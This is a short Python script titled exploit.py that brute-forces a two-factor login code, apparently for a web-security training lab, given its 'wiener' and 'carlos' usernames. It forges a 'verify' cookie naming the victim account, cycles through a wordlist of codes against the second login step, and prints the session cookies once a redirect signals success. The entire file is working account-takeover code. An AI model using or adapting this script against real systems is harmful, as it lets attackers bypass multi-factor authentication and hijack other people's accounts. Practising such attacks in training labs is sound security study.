import requests
import sys

if (len(sys.argv) != 2):
    print("USAGE: exploit.py <url>")
    sys.exit(1)

url = sys.argv[1]
attacker = "wiener"
victim = "carlos"

r = requests.get(url)
cookie_value = r.cookies['session']

#print(cookie_value)
file1 = open('creds/otp_pay','r')
opts = file1.readlines()

for opt in opts:
    headers = {'Cookie' : 'session='+ cookie_value+'; verify='+victim}
    data = {'mfa-code' : opt}

    p = requests.post(url+'login2',headers=headers,data=data, allow_redirects=False)
    print("Tried: {0}".format(opt),end="\r",flush=True)
    if(int(p.status_code) == 302 ):
        print(p.cookies)
    else:
        continue

    

